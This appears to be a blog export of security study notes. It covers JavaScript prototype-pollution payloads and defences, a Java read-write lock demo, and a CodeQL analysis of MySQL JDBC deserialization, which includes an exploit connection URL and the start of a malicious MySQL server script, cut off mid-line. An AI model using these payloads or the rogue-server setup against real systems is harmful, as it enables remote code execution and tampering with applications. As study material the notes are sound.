    <url>/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10317892">https://ithelp.ithome.com.tw/articles/10317892</a></li>
</ul>
<blockquote>
<p>有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要<br><a href="https://ithelp.ithome.com.tw/articles/10317133">Universal XSS</a><br><a href="https://ithelp.ithome.com.tw/articles/10316778">Mutation XSS</a><br><span id="more"></span></p>
</blockquote>
<h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>总感觉自己讲不清楚，还是去看别人写的吧<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><br>当用JSON.parse可以把<strong>proto</strong>当为纯键值。<br>调试分析了一下，发现在第二层的时候会判断<code>__proto__</code>是否在对象中，对于target来说是原型链存在，对于source来说是普通的键值，就是<code>&#123;&#39;b&#39;:2&#125;</code><br>当然也可以用<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;constructor&quot;: &#123;&quot;prototype&quot;:&#123;&quot;b&quot;: 2&#125;&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><br>在控制台输入<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj = &#123;&#125;</span><br><span class="line">obj.<span class="property">__proto__</span> == obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> </span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
<h2 id="constructor-和-prototype"><a href="#constructor-和-prototype" class="headerlink" title="constructor 和 prototype"></a>constructor 和 prototype</h2><p>这时候会引出一个问题，就是经常会看到，一会是<code>constructor.prototype</code>，一会又是<code>prototype.constructor</code>，这时候就很容易搞混<br>可以参考这篇文章，我感觉我自己都有点迷糊<br><a href="https://wangdoc.com/javascript/oop/prototype">https://wangdoc.com/javascript/oop/prototype</a><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">color</span> = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;二毛&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span><span class="comment">//false</span></span><br></pre></td></tr></table></figure></p>
<p>同样是<code>constructor.prototype</code>，Animal是Function，cat1是Object<br><code>cat1.constructor</code>指向他的构造函数，也就是<code>Animal</code><br><code>Animal.constructor</code>也是指向他的构造函数，但是是<code>Function</code>，所以下面的就会是true<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Animal</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure></p>
<p><code>__proto__</code>可以用来访问对象的原型，也就是<code>prototype</code><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">cat1.<span class="property">__proto__</span>.<span class="property">__proto__</span> == <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">cat1.<span class="property">__proto__</span> == <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="literal">true</span> </span><br></pre></td></tr></table></figure><br>原理这些还是自己去找资料吧，感觉我讲的也不清晰</p>
<h1 id="Prototype-pollution-script-gadgets"><a href="#Prototype-pollution-script-gadgets" class="headerlink" title="Prototype pollution script gadgets"></a>Prototype pollution script gadgets</h1><p><a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></p>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="过滤字符串过滤"><a href="#过滤字符串过滤" class="headerlink" title="过滤字符串过滤"></a>过滤字符串过滤</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key === <span class="string">&quot;constructor&quot;</span> || key == <span class="string">&#x27;__proto__&#x27;</span> || key == <span class="string">&quot;prototype&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;No pollution&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="创建一个空对象"><a href="#创建一个空对象" class="headerlink" title="创建一个空对象"></a>创建一个空对象</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="comment">// TypeError: Cannot set property &#x27;a&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
<h2 id="冻结prototype"><a href="#冻结prototype" class="headerlink" title="冻结prototype"></a>冻结prototype</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line">obj[<span class="string">&#x27;__proto__&#x27;</span>][<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj2.<span class="property">a</span>)</span><br></pre></td></tr></table></figure>
<p>不会报错，只是不能被修改，可能会增加debug的难度</p>
<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><p>通过<code>--disable-proto</code>关掉<code>prototype</code><br><a href="https://nodejs.org/api/cli.html#cli_disable_proto_mode">官方文档</a></p>
<h1 id="隐形的前端gadget"><a href="#隐形的前端gadget" class="headerlink" title="隐形的前端gadget"></a>隐形的前端gadget</h1><p>可以通过更改前端的API的一些变量<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = <span class="string">&#x27;a=1&#x27;</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>例如上面这种，就会把本来应该发送GET请求的代码，变成发送POST<br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A87-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt></p>
<p>有时候有些条件可以让你直接把<code>fetch</code>给覆盖了，这样他的代码都会走你的假<code>fetch</code>，这也是爬虫里面经常用到的技巧<br>例如下面的代码，参考 <a href="https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA">https://mp.weixin.qq.com/s/H4oQvqZmWS4af1VF1nAzkA</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> stringify = <span class="title class_">JSON</span>.<span class="property">stringify</span>;</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="property">stringify</span> = <span class="keyword">function</span>(<span class="params">params</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook JSON.stringify ——&gt; &quot;</span>, params);</span><br><span class="line">        <span class="keyword">debugger</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">stringify</span>(params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> open = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span> (<span class="params">method, url, <span class="keyword">async</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.<span class="title function_">indexOf</span>(<span class="string">&quot;rnd&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> open.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>把原来的API备份一份，然后在把原来的API给覆盖了</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题2</title>
    <url>/2023/10/02/%E5%88%B7%E9%A2%982/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="c3da76820f00cc470e9404a57133e76fc5233b907e109ae865e1803f32f971d3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>读写锁</title>
    <url>/2023/10/06/%E8%AF%BB%E5%86%99%E9%94%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>调试JDBC反序列化的时候，里面有这种操作，有点好奇就来看看<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ConnectionUrl <span class="title function_">getConnectionUrlInstance</span><span class="params">(String connString, Properties info)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (connString == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ExceptionFactory.createException(WrongArgumentException.class, Messages.getString(<span class="string">&quot;ConnectionString.0&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">connStringCacheKey</span> <span class="operator">=</span> buildConnectionStringCacheKey(connString, info);</span><br><span class="line">        ConnectionUrl connectionUrl;</span><br><span class="line"></span><br><span class="line">        rwLock.readLock().lock();</span><br><span class="line">        connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">        <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">            rwLock.readLock().unlock();</span><br><span class="line">            rwLock.writeLock().lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Check again, in the meantime it could have been cached by another thread.</span></span><br><span class="line">                connectionUrl = connectionUrlCache.get(connStringCacheKey);</span><br><span class="line">                <span class="keyword">if</span> (connectionUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">ConnectionUrlParser</span> <span class="variable">connStrParser</span> <span class="operator">=</span> ConnectionUrlParser.parseConnectionString(connString);</span><br><span class="line">                    connectionUrl = Type.getConnectionUrlInstance(connStrParser, info);</span><br><span class="line">                    connectionUrlCache.put(connStringCacheKey, connectionUrl);</span><br><span class="line">                &#125;</span><br><span class="line">                rwLock.readLock().lock();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                rwLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        rwLock.readLock().unlock();</span><br><span class="line">        <span class="keyword">return</span> connectionUrl;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.readLock().lock();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">            rwl.readLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rwl.writeLock().lock();</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            rwl.writeLock().unlock();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainReadWritLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ReadWriteLockTest</span> <span class="variable">rwlt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReadWriteLockTest</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.get();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                    rwlt.put();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read second value:0.0</span><br><span class="line">----Thread:Thread-1----read second value:0.0</span><br><span class="line">----Thread:Thread-0----read second value:0.0</span><br><span class="line">----Thread:Thread-2----read second value:0.0</span><br><span class="line">----Thread:Thread-3----read second value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.38882443875894124</span><br><span class="line">----Thread:Thread-6----write first value:0.537279172993168</span><br></pre></td></tr></table></figure><br>可以看到，在<code>read second value</code>这一段结束了，才开始write的操作，也就是说在没有释放<code>readlock</code>的时候,<code>writelock</code>是锁着的，也就是 <strong>读读不互斥，写写不互斥，读写有互斥</strong><br>如果把锁注释，也就是下面的代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.ReentrantReadWriteLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReadWriteLockTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">data</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">ReentrantReadWriteLock</span> <span class="variable">rwl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantReadWriteLock</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----read second value:&quot;</span>+data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            data = Math.random();</span><br><span class="line">            System.out.println(<span class="string">&quot;----Thread:&quot;</span>+Thread.currentThread().getName()+<span class="string">&quot;----write first value:&quot;</span>+data);</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----Thread:Thread-2----read first value:0.0</span><br><span class="line">----Thread:Thread-3----read first value:0.0</span><br><span class="line">----Thread:Thread-0----read first value:0.0</span><br><span class="line">----Thread:Thread-1----read first value:0.0</span><br><span class="line">----Thread:Thread-4----read first value:0.0</span><br><span class="line">----Thread:Thread-5----write first value:0.7311360215541859</span><br><span class="line">----Thread:Thread-6----write first value:0.32755079667745735</span><br><span class="line">----Thread:Thread-0----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-1----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-3----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-2----read second value:0.32755079667745735</span><br><span class="line">----Thread:Thread-4----read second value:0.32755079667745735</span><br></pre></td></tr></table></figure><br>可以看到write写到中间了</p>
<h1 id="getConnectionUrlInstance"><a href="#getConnectionUrlInstance" class="headerlink" title="getConnectionUrlInstance"></a>getConnectionUrlInstance</h1><p>回到开头的代码，可以发现这里是在读取缓存的时候加锁，读完了就释放，然后在加上写锁，往缓存列表放入URL</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>多线程</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>thread</tag>
      </tags>
  </entry>
  <entry>
    <title>用codeql分析JDBC反序列化</title>
    <url>/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网上大部分都是直接分析JDBC的过程，我这里就不赘述了，这里说一下用codeql分析的思路<br><span id="more"></span></p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>pom.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>加载完pom以后调试的时候会显示download source，这时候就可以把源码下下来了，然后去repository里面找到源码</p>
<p><a href="https://github.com/waderwu/extractor-java">https://github.com/waderwu/extractor-java</a></p>
<p>用该项目去生成database</p>
<p>java代码</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_Url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3307/test?&quot;</span>+</span><br><span class="line">                <span class="string">&quot;autoDeserialize=true&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(JDBC_Url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    </div>
</div>
<p>python的恶意服务器，记得自己用ysoserial生成payload<br><div class="spoiler collapsed">
    <div class="spoiler-title">
        点击显/隐内容
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span 